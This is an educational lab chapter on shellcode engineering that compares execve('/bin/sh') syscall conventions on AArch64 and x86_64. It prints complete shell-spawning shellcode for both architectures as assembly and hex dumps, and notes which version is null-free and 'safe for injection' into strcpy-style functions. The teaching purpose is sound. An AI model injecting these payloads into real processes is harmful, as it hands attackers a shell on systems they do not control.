# 04. Shellcode Engineering and Assembly Generation (Shellcode Engineering)

Analyzing the **architecture and engineering constraints of Shellcode**—pure machine opcode payloads injected by attackers to hijack the CPU instruction pointer and spawn interactive root shells. Features **AArch64 (ARM64)** as the primary target for modern device and embedded systems security, alongside comparative analysis with **x86_64**.

---

## 1. Learning Objectives & Overview

- Understand that shellcode comprises raw machine opcodes executable directly by the CPU without a linker or runtime.
- Contrast Linux 64-bit `execve("/bin/sh")` syscall register requirements between AArch64 (`X8=221`, `svc #0`) and x86_64 (`RAX=59`, `syscall`).
- Analyze opcode encoding differences between fixed 4-byte RISC (AArch64) and variable-length CISC (x86_64).
- Examine null-byte (`\x00`) elimination techniques and why fixed-width architectures require specialized approaches.
- Study the mechanics of **Position-Independent Code (PIC)** using relative addressing.

---

## 2. Interactive Shellcode Bytecode & Architecture Inspector

Explore and compare hexadecimal bytecode instructions and register state changes between AArch64 and x86_64 in the interactive tool below:

<div style="width: 100%; margin: 24px 0; border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; overflow: hidden;">
  <iframe src="../../assets/diagrams/principles/04-shellcode.html" style="width: 100%; border: none; display: block; overflow: hidden;" scrolling="no" onload="try { const c = this.contentWindow.document.getElementById('diagramCanvas'); if(c) this.style.height = Math.ceil(c.getBoundingClientRect().height) + 'px'; } catch(e){}"></iframe>
</div>

---

## 3. Linux `execve` System Call Conventions: AArch64 vs. x86_64

The objective of an initial payload is invoking `sys_execve` to overwrite the current process with `/bin/sh`:

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

| Parameter | AArch64 (ARM64 - Default) | x86_64 (AMD64) |
| :--- | :--- | :--- |
| **Syscall Number** | `X8` = 221 (`0xdd`, `__NR_execve`) | `RAX` = 59 (`0x3b`, `__NR_execve`) |
| **1st Arg (`pathname`)** | `X0` = pointer to `"/bin/sh"` | `RDI` = pointer to `"/bin/sh"` |
| **2nd Arg (`argv`)** | `X1` = `NULL (0)` or `[&"/bin/sh", NULL]` | `RSI` = pointer to `["/bin/sh", NULL]` |
| **3rd Arg (`envp`)** | `X2` = `NULL (0)` | `RDX` = `NULL (0)` |
| **Syscall Trigger** | `svc #0` (Supervisor Call) | `syscall` |

---

## 4. Deep Architectural Shellcode Comparison

=== "AArch64 (ARM64 - Default Target)"
    AArch64 utilizes a **fixed 32-bit (4-byte)** instruction encoding scheme:

    ```assembly
    // [1] Load relative address of "/bin/sh" string located 20 bytes forward into X0
    adr    x0, #20              // 10 00 00 a0 (4 bytes)
    // [2] Clear X1 (argv) and X2 (envp) using zero register (xzr)
    mov    x1, xzr              // aa 1f 03 e1 (4 bytes)
    mov    x2, xzr              // aa 1f 03 e2 (4 bytes)
    // [3] Set syscall number to 221 (__NR_execve)
    mov    x8, #0xdd            // d2 80 1b a8 (4 bytes)
    // [4] Enter kernel privilege via supervisor call
    svc    #0                   // d4 00 00 01 (4 bytes)
    // [5] Embedded null-terminated string
    .string "/bin/sh"           // 2f 62 69 6e 2f 73 68 00 (8 bytes)
    ```

    > [!IMPORTANT]
    > **AArch64 Null-Byte Realities**:
    > Because AArch64 instructions are strictly 32-bit aligned, instructions like `svc #0` (`\x01\x00\x00\xd4`) and `adr` naturally contain null (`0x00`) byte fields. For string-based functions like `strcpy()`, attackers utilize decoder stubs or non-zero immediate variations. However, in modern exploits targeting binary sockets (`read()`, `recv()`) or raw memory corruption, null bytes are preserved without issue.

=== "x86_64 (AMD64 - Comparative Target)"
    x86_64's variable-length CISC encoding allows completely null-free instruction sequences:

    ```nasm
    // [1] Zero RAX without null bytes
    xor    %eax, %eax               // 31 c0
    // [2] Load 64-bit immediate string "/bin//sh"
    movabs $0x68732f2f6e69622f, %rbx// 48 bb 2f 62 69 6e 2f 2f 73 68
    // [3] Push string to stack to establish pointer
    push   %rbx                     // 53
    mov    %rsp, %rdi               // 48 89 e7 (RDI = &"/bin//sh")
    // [4] Push NULL and setup argv/envp
    push   %rax                     // 50 (NULL)
    mov    %rsp, %rdx               // 48 89 e2 (RDX = NULL)
    push   %rdi                     // 57 (&"/bin//sh")
    mov    %rsp, %rsi               // 48 89 e6 (RSI = argv)
    // [5] Load syscall 59 via 8-bit AL register and execute
    mov    $0x3b, %al               // b0 3b
    syscall                         // 0f 05
    ```

---

## 5. Lab Source Code & Opcode Inspection

- **Lab Source Code**: [`shellcode_tester.c`](../../assets/labs/principles/04-shellcode/shellcode_tester.c) (Local Asset) | [GitHub Source Code Repository :octicons-mark-github-16:](https://github.com/auking45/linux-kernel-hardening-lab/blob/main/labs/principles/04-shellcode/shellcode_tester.c)
- **Dedicated Makefile**: [`Makefile`](../../assets/labs/principles/04-shellcode/Makefile)

### 5.1 Running Opcode Inspection

=== "AArch64 (Default Target)"
    ```bash
    cd labs/principles/04-shellcode
    make run
    ```

    ```
    === Running Shellcode Inspection on aarch64 ===
    qemu-aarch64 -L /usr/aarch64-linux-gnu ./shellcode_tester
    === Linux Kernel Hardening Lab - Shellcode Engineering ===

    ============================================================
     Shellcode Inspection [x86_64] (Total Length: 28 bytes)
    ============================================================
    [Hex Dump]
      \x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68
      \x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6
      \xb0\x3b\x0f\x05

    [Analysis]
      [+] Null-Byte Check: PASSED (0 null bytes detected).
          Safe for injection into strcpy(), gets(), sprintf().
    ============================================================

    ============================================================
     Shellcode Inspection [ARM64] (Total Length: 28 bytes)
    ============================================================
    [Hex Dump]
      \xa0\x00\x00\x10\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa
      \xa8\x1b\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e
      \x2f\x73\x68\x00

    [Analysis]
      [-] Null-Byte Check: WARNING (5 null byte(s) detected).
    ============================================================
    ```

=== "x86_64 (Comparative Target)"
    ```bash
    cd labs/principles/04-shellcode
    make ARCH=x86_64 run
    ```

    - Inspect null-free x86_64 byte execution natively.

---

## 6. Summary & Next Chapter

- Shellcodes represent compact machine instructions configured specifically to trigger kernel system calls using architecture ABI registers.
- AArch64 uses 4-byte fixed instructions with `adr` relative references, while x86_64 leverages variable-length instructions and stack manipulation to achieve null-free payloads.
- In the next chapter, we demonstrate leveraging these principles to hijack program execution: **[05. Classic Buffer Overflow and RIP/PC Hijacking](05-stack-bof-rip.md)**.
